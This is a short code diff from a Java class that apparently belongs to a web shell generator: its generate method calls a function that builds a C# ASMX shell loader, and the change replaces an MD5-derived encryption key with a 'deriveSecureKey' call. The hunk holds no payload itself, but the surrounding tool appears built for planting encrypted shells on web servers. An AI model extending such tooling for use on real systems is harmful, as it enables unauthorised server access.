@@ -85,7 +85,7 @@ public class CShapAsmxAesBase64Ex implements Cryption {
    }
 
    public byte[] generate(String password, String secretKey) {
-      return Generate.GenerateShellLoderByAsmx("csharpShellEx", password, functions.md5(secretKey).substring(0, 16));
+      return Generate.GenerateShellLoderByAsmx("csharpShellEx", password, functions.deriveSecureKey(secretKey));
    }
 
    private static String readXmlRequest(String pass) {
